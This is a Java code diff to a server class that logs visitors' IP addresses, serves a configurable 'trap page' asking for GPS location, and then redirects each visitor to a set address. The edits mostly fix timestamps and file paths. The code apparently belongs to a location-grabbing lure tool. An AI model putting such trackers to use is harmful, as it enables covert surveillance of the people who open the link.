@@ -172,7 +172,7 @@ public class DataChain {
 				ers.currentMillis = System.currentTimeMillis();
 				ers.ip = session.getHeaders().getOrDefault("remote-addr", "127.0.0.1");
 				dir = new File(dir, "sessions");
-				dir = new File(dir, System.currentTimeMillis() + ".json");
+				dir = new File(dir, ers.currentMillis + ".json");
 				json = gson.toJson(ers);
 				try {
 					Files.write(dir.toPath(), json.getBytes(StandardCharsets.UTF_8));
@@ -194,23 +194,24 @@ public class DataChain {
 				GPSGetSession ggs = new GPSGetSession();
 				ggs.currentMillis = System.currentTimeMillis();
 				ggs.ip = session.getHeaders().getOrDefault("remote-addr", "127.0.0.1");
+				ggs.done = false;
 				dir = new File(dir, "sessions");
-				dir = new File(dir, System.currentTimeMillis() + ".json");
+				dir = new File(dir, ggs.currentMillis + ".json");
 				json = gson.toJson(ggs);
 				try {
 					Files.write(dir.toPath(), json.getBytes(StandardCharsets.UTF_8));
 				} catch (IOException e) {
 				}
 
-				String s = main.getInternalFileContent("gps_get_test.html");
+				String s = main.getInternalFileContent("gps_get_trappage.html");
 				Document doc = Jsoup.parse(s);
 				doc.select("title").get(0).text(ggo.title);
-				doc.select("h2.title").get(0).text(ggo.title);
+				doc.select("h2").get(0).text(ggo.title);
 				doc.select("div>h3").get(0).text(ggo.message);
 				doc.select("p.reqire_gps").get(0).text(ggo.gps_message);
 				doc.select("button#gps_get").get(0).text(ggo.gps_button);
 				doc.select("form").get(0).attr("action", doc.select("form").get(0).attr("action")
-						.replace("{TIME}", ggs.currentMillis + "").replace("", np.publicKey));
+						.replace("{TIME}", ggs.currentMillis + "").replace("{PUBLIC}", np.publicKey));
 				s = doc.html();
 
 				result = NanoHTTPD.newFixedLengthResponse(s);
@@ -226,8 +227,8 @@ public class DataChain {
 			String[] splitted = path.split("\\/");
 			String publicKey = splitted[2];
 			String sessionID = splitted[3];
-			File traceDir = new File(filesDir, publicKey + File.pathSeparatorChar);
-			File sessionFile = new File(traceDir, "sessions" + File.pathSeparatorChar + sessionID + ".json");
+			File traceDir = new File(filesDir, publicKey);
+			File sessionFile = new File(new File(traceDir, "sessions"), sessionID + ".json");
 			if (sessionFile.exists()) {
 				String json, json2;
 				try {
@@ -235,6 +236,7 @@ public class DataChain {
 					json2 = new String(Files.readAllBytes(new File(traceDir, "options.json").toPath()),
 							StandardCharsets.UTF_8);
 				} catch (IOException e) {
+					e.printStackTrace();
 					return null;
 				}
 				GPSGetOptions ggo = gson.fromJson(json2, GPSGetOptions.class);
@@ -329,14 +331,15 @@ public class DataChain {
 					try {
 						Files.write(sessionFile.toPath(), json2.getBytes());
 					} catch (IOException e) {
-						return null;
-					}
-					if (ggo.close) {
-						result = CPMain.newRedirectResponse("http://" + CPMain.HOST + "/close");
-					} else {
-						result = CPMain.newRedirectResponse(ggo.address);
 					}
 				}
+				if (ggo.close) {
+					result = CPMain.newRedirectResponse("http://" + CPMain.HOST + "/close");
+				} else {
+					result = CPMain.newRedirectResponse(ggo.address);
+				}
+			} else {
+				System.err.println("File does not exists");
 			}
 		}
 		return result;
